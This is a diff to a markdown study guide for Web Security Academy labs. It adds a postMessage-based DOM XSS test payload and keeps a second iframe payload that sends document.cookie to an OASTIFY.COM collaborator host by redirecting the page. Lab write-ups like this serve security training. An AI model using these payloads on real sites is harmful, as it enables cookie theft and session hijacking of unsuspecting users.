@@ -328,8 +328,13 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![source-code-web-message-url.png](images/source-code-web-message-url.png)  
 
->The exploit server hosted payload below includes the ```https``` string, and is successful in bypassing the `if` condition check.  
+>The exploit server hosted payloads below include the ```https``` string, and are successful in bypassing the `if` condition check.
 
+Try this one first in the Exploit Server to see if XSS works (string `http` appears commented otherwise the `if`does not execute)
+```html
+<iframe src="https://0a5b007003a98567843f3c1a004a0075.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+```
+> Now, try this one
 ```html
 <iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')">
 ```  
